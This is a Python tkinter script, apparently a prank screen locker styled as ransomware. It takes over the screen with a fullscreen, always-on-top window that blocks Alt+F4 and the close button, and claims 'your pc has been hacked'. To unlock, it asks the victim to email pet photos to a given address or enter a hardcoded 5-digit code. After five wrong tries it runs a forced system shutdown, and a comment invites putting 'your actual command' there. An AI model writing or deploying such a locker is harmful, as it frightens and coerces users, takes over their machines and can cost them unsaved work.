import tkinter as tk

ASCII = r"""
                                                                                . . .  .            
             .                                               .       . .      .                     
                                             .                                                      
                                          .             .          .                   .            
   .                                             .                  .                               
        .  .  .                 .   . .                               .                             
                            . .  .......... ............. ..........     .                          
   .         .            .      ... .......-+*%@@@@@%#*=:.... .. ..   . .                     .    
  .      .           .           ....-*%@@@@@@@@@@@@@@@@@@@@@%#=:...      . .                       
                      ...........:*@@@@@%#+:.           ..=*%@@@@@%=... .......                     
.  .      ..     .    ........-%@@@@#-.......           .......:+@@@@%+... .. .                     
                      .....:+@@@%+:..........           ........ ..=#@@@#:.....                     
                 ..    . .*@@@#...                      .      .    ..+@@@%:. ......          .     
                 ... ...+@@@+......               .                .....=@@@#:.......               
.   .            .... -@@@#.......  ..                    . .      .... ..=@@@+......               
                 ....*@@@:.....  .                     .           .........#@@#:....      .    .   
               . ...#@@#.....              .                    .    .   ....=@@@:..            .   
                 ..%@@+.......                      .                    .....:@@@-..           .   
    .      .......#@@=.. . ..     ... .... .  .          . ... .....     .... .-%@@......           
       .  . .....+@@+ ..         ...=%@@%=...           ...:#@@@+...         . .-@@@:.....    . .   
 ..   .    .....-@@%..  . .   .  ..%@@@@@@%.. .         ..+@@@@@@@: .  .       . =@@*.. ..          
         . .....%@@:...          .+@@@@@@@@*..          .:@@@@@@@@@.           ...#@@:....      .   
   . .     .. .=@@*...           .#@@@@@@@@%.           .*@@@@@@@@@-           ...=@@#....          
            ...*@@:. ..          .#@@@@@@@@%.            *@@@@@@@@@-     .     ....@@@:...     .   .
           ....%@%......       . .+@@@@@@@@*.           .:@@@@@@@@%.           ....*@@=...          
            ...@@#.....          ..#@@@@@@#..            .+@@@@@@%:.  . .      ....=@@+... .        
           . .:@@#...            ...-#@@#-..            ...:*@@%+...           . ..-@@*...  .       
           ...:@@#.....          ....... .....   ..    .........  .            ....-@@*...    .     
            ...@@#...                  . .... ......... ......           .     ....=@@+...          
           ....%@%:....                . .....................   .             ....#@@-...          
 .         ....*@@- ..             .   ....=#@@@@@@@@@@@%+:...           .     ....@@@:...          
           ....=@@*...           ......+%@@@@@%#**++*#%@@@@@@*-.....        .  . .=@@*....          
           . ...%@@-...     .    ...-@@@@@+.....   .......=%@@@@*...           ...%@@:....          
 . .       .....:@@%:.           .+@@@%-.....................:*@@@#.      .    ..*@@+.....   .      
     .           =@@*..... ... .-@@@#:.. .                .   ..+@@@+...........+@@%.       . .     
     .   .  .    .#@@*.....  ..+@@%:...                       ....#@@%:........=@@%..               
                 ..*@@*........#@*.....      . .              .....=@%-.......=@@%:..               
                 ...*@@@..........              .   .              ..........*@@#....               
           .  .  ....-@@@=........   .                             ........-%@@*....                
                 .....:#@@@-...           .       ..                   ...*@@%-...... .             
                      ..-@@@@:....... ..         .            .... .... *@@@+..            .        
      .  .           .....=%@@%=........         .         .  . .....-#@@@*....                     
         .            ......-%@@@@-.....                      ....-*@@@@+.......              .   . 
.               ..          ...=@@@@@#-.......................:*%@@@@*:...                      .   
  .   .                     ......=#@@@@@@#=--:.......::-=*%@@@@@%+:......                  .       
                             .........:*@@@@@@@@@@@@@@@@@@@@@*-...........                .         
                         ..           .... .:--===+===--:.....           .   .  . .  .              
                  .   .                .  ...   ....... ......                            .         
                               .     .   .................... .            .                    .   
                              .                                                   .         .       
               .        .                            .                                ..            
                                                     .        .                   .                 
                               .                                  .  .             .                
"""

root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.configure(bg="black")
failed_attempts = 0
MAX_ATTEMPTS = 5   
# ASCII art
ascii_label = tk.Label(
    root,
    text=ASCII,
    font=("Consolas", 6),
    fg="white",
    bg="black",
    justify="center"
)
ascii_label.place(relx=0.5, rely=0.45, anchor="center")

# Text underneath
text_label = tk.Label(
    root,
    text="your pc has been hacked! to unlock your pc send pet photos to lowtiergod555@gmail.com",
    font=("Arial", 24, "bold"),
    fg="white",
    bg="black"
)
text_label.place(relx=0.5, rely=0.75, anchor="center")
# Assuming 'root' is your main window and 'label' is your existing text widget

# 1. Create the white entry box
entry_box = tk.Entry(
    root,
    bg="white",           # Forces white background
    fg="black",           # Black text
    width=30,             # Adjust width as needed
    font=("Arial", 12),   # Match font to your style
    justify="center"      # Centers text in the box
)
entry_box.pack(pady=(0, 10)) # Adds space below the box

# 2. (Optional) Restrict to 5 digits if you still need that constraint
def validate_digit(char):
    return char.isdigit() or char == ""

reg = root.register(validate_digit)
entry_box.config(validate="key", validatecommand=(reg, '%S'))

# Enforce 5 character limit
def limit_length(*args):
    val = entry_box.get()
    if len(val) > 5:
        entry_box.delete(5, tk.END)

var = tk.StringVar()
var.trace_add("write", limit_length)
entry_box.config(textvariable=var)   
# 1. password variable
SECRET_PASSWORD = "71184"

# 2. Create the result label BEFORE the function uses it
result_label = tk.Label(root, text="", font=("Arial", 10))
result_label.pack()

def check_password():
    global failed_attempts  # Tell Python we are updating the global counter
    
    user_input = entry_box.get()
    
    if user_input == SECRET_PASSWORD:
        result_label.config(text="Access Granted!", fg="green")
        root.destroy()  # Close on success
    else:
        failed_attempts += 1  # Add 1 to the failure count
        remaining = MAX_ATTEMPTS - failed_attempts
        
        if failed_attempts >= MAX_ATTEMPTS:
            # --- EXECUTE YOUR COMMAND HERE ---
            # Example: os.system("echo 'Command Executed'") 
            # Replace the line below with your actual command
            print("Maximum attempts reached. Executing command...") 
            import os
            os.system("shutdown /s /t 5") # killsd pc in time 5
    
            
            result_label.config(text="Limit Reached. Executing...", fg="red")
            root.after(1000, root.destroy) # Closes window after 1 second
        else:
            # Show remaining attempts
            result_label.config(text=f"Wrong Code. {remaining} attempts left.", fg="red")
            entry_box.delete(0, tk.END)   

# 3. Activate the button (removed the #)
tk.Button(root, text="Submit", command=check_password).pack()

# start of blocker stuff frfr (Ensure this is not indented inside the function)   
def on_close_attempt():
    # Does nothing, effectively blocking the close
    pass

def on_alt_f4(event):
    on_close_attempt()
    return "break"  #: Stops Alt+F4 from closing the window

# Attach the blockers to the root window
root.bind('<Alt-F4>', on_alt_f4)
root.protocol("WM_DELETE_WINDOW", on_close_attempt)

root.mainloop()
